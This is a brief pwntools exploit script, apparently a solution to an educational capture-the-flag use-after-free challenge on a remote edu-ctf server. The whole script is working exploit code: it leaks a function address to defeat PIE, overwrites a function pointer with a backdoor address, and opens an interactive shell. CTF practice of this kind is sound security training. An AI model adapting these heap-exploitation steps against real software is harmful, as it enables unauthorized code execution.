#!/usr/bin/python3
from pwn import *

binary = remote('edu-ctf.csie.org', 10177)
#binary = process('./uaf')

# First Round: Information Leak
binary.sendafter('Size of your message: ', str(0x10))
binary.sendafter('Message: ', 'a'*8)

binary.recvuntil('a'*8)
bye = u64(binary.recv(6) + b'\0\0')
# objdump -d to get the function offsets
bye_offset = 0xa77
pie_base = bye - 0xa77
success('PIE -> ' + hex(pie_base))

# Second Round: Overflow Function Address
binary.sendafter('Size of your message: ', str(0x10))
backdoor_offset = 0xab5
binary.sendafter('Message: ', b'a'*8 + p64(pie_base + backdoor_offset))

# Last Round: malloc a chunk that's not fast bin
binary.sendafter('Size of your message: ', str(0x100))
binary.sendafter('Message: ', 'a'*8)

binary.interactive()
